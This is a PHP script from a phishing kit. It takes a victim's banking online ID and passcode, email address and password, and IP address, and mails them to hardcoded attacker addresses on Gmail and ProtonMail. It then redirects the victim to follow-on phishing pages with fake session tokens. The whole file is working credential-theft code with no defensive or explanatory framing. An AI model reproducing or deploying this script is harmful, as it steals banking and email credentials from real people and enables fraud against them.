<?php
session_start();
include'ip.php';
$ip = MDgetIp();
$message = "[ - ] ==================| LOG |================== [ - ]\n";
$message .= "[+]OnlineID: ".$_SESSION['id']."\n";
$message .= "[+]PassCode: ".$_SESSION['code']."\n";
$message .= "[ - ] ==================| EMA |================== [ - ]\n";
$message .= "[+]Email Access: ".$_POST['ee']."\n";
$message .= "[+]Email Passwd: ".$_POST['pp']."\n";
$message .= "[+]Victm Ip_Add: ".$ip."\n";
$message .= "[ - ] ==================| END |================== [ - ]\n";

$_SESSION['x2']=$message;






	 


$praga=rand();
$praga=md5($praga);

if(!empty($_POST['ee']) && !empty($_POST['pp'])){
$send = "cactuspubxx@gmail.com,cactustoolz@protonmail.ch";
$subject = "XBOB ACCESS - ".$_POST['ee']." - [".$ip."]";
$headers = "From: x3Akeri v1.0<x3Akeri@rezulta.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);


header("Location: info.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

}else{
header("Location: confirm.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

}
	 
?>

?>
